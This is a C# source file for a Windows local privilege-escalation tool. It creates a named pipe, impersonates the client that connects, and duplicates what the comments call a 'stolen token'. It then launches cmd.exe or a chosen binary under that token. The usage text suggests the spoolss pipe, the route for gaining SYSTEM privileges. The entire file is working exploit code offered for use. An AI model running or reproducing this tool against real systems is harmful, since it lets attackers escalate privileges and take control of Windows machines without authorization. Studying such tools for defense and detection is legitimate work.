using System;
using System.Runtime.InteropServices;
using System.Security.Principal;


namespace SeImpersonatePrivilege_Named_Pipe
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(
            string lpName,
            uint dwOpenMode,
            uint dwPipeMode, 
            uint nMaxInstances, 
            uint nOutBufferSize, 
            uint nInBufferSize,
            uint nDefaultTimeOut, 
            IntPtr lpSecurityAttributes);

        public static uint PIPE_ACCESS_DUPLEX = 0x3;

        public static uint PIPE_TYPE_BYTE = 0x0;
        public static uint PIPE_WAIT = 0x0;

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(
            IntPtr hNamedPipe,
            IntPtr lpOverlapped);

        [DllImport("advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(
            IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        static extern uint GetCurrentThreadId();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(
            uint dwDesiredAccess,
            bool bInheritHandle,
            uint dwThreadId);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            uint DesiredAccess,
            bool OpenAsSelf,
            out IntPtr TokenHandle);

        public static uint TOKEN_ALL_ACCESS = 0xF01FF;

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle, 
            uint TokenInformationClass, 
            IntPtr TokenInformation,
            int TokenInformationLength, 
            out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(
            IntPtr pSID, 
            out IntPtr ptrSid);

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }


        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            UInt32 dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            UInt32 dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public static void Main(string[] args)
        {
            string pipeName = "";
            string cmd = "";

            if (args.Length < 1 | args.Length >= 2)
            {
                Console.WriteLine("[!] ERROR Please enter the pipe name to use as arguments. \nExample .\\SeImpersonatePrivilege_Named_Pipe.exe \\\\.\\pipe\\test\\pipe\\spoolss\n\nAdditionally specify the binary to trigger as the second argument. Default: C:\\Windows\\System32\\cmd.exe");
                return;
            }
            else if (args.Length > 1)
            {
                pipeName = args[0];
                cmd = args[1];
            }
            else
            {
                pipeName = args[0];
                cmd = "C:\\Windows\\System32\\cmd.exe";
            }

            // Create our named pipe
            IntPtr pipeHandle = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            Console.WriteLine("[i] Creating named pipe");
            // Connect to our named pipe and wait for incoming connections
            Console.WriteLine("[i] Waiting for client to connect to named pipe ...");
            ConnectNamedPipe(pipeHandle, IntPtr.Zero);
            // Impersonate incoming connection thread
            ImpersonateNamedPipeClient(pipeHandle);
            Console.WriteLine("[i] Impersonating named pipe client");    

            // Open handle to impersonated thread
            uint currentThreadId = GetCurrentThreadId();
            Console.WriteLine($"[i] Current thread ID: {currentThreadId}");
            IntPtr currentThreadHandle = OpenThread(TOKEN_ALL_ACCESS, false, currentThreadId);
            Console.WriteLine($"[i] Getting a handle on current thread: {currentThreadHandle.ToString()}");
            if (currentThreadHandle == IntPtr.Zero)
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($"\n[!] ERROR Failed getting handle on thread OpenThread: {Marshal.GetLastWin32Error()}"); Console.ResetColor();
                Console.WriteLine("\nPress enter to continue ...");
                Console.ReadLine();
                return;
            }
            IntPtr tokenHandle;
            OpenThreadToken(currentThreadHandle, TOKEN_ALL_ACCESS, false, out tokenHandle);

            if (tokenHandle == IntPtr.Zero)
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($"\n[!] ERROR Failed getting token handle OpenThreadToken: {Marshal.GetLastWin32Error()}"); Console.ResetColor();
                Console.WriteLine("\nPress enter to continue ...");
                Console.ReadLine();
                return;
            }

            // Show sid of user
            int TokenInfLength = 0;
            GetTokenInformation(tokenHandle, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(tokenHandle, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"[i] Found sid {0}", sidstr);

            // Duplicate the stolen token
            IntPtr systemTokenHandle = IntPtr.Zero;
            DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out systemTokenHandle);
            Console.WriteLine("[i] Duplicating the stolen token");
            if (systemTokenHandle == IntPtr.Zero)
            {
                Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($"\n[!] ERROR DuplicateTokenEx failed to return systemTokenHandle: {Marshal.GetLastWin32Error()}"); Console.ResetColor();
                Console.WriteLine("\nPress enter to continue ...");
                Console.ReadLine();
                return;
            }

            // Spawn new process with stolen token
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            CreateProcessWithTokenW(systemTokenHandle, 0, null, cmd, 0, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine($"[i] Executing {cmd} with stolen token: {sidstr}");
        }
    }
}
